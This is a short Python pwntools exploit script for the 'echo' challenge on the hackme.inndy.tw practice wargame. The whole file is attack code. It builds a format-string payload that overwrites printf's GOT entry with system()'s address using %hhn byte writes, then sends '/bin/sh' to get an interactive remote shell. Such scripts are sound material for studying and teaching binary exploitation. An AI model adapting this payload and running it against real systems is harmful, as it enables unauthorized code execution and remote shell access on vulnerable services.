from pwn import *

context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
target = remote('hackme.inndy.tw', 7711)
elf = ELF('./echo')
plt_sys = elf.symbols['system']
got_printf = elf.got['printf']
print hex(plt_sys)  #0x8048400
print hex(got_printf) #0x804a010

payload = p32(got_printf)
payload += p32(got_printf + 1)
payload += p32(got_printf + 2)
payload += p32(got_printf + 3)
payload += '%'
payload += str(0x100 - 0x10)
payload += 'c%7$hhn'
payload += '%'
payload += str(0x84)
payload += 'c%8$hhn'
payload += '%'
payload += str(0x104 - 0x84)
payload += 'c%9$hhn'
payload += '%'
payload += str(0x108 - 0x104)
payload += 'c%10$hhn'
# print payload

# payload2 = fmtstr_payload(7,{got_printf:plt_sys})
# print payload2
target.sendline(payload)
target.recvuntil('\n')
target.sendline('/bin/sh\x00')
target.interactive()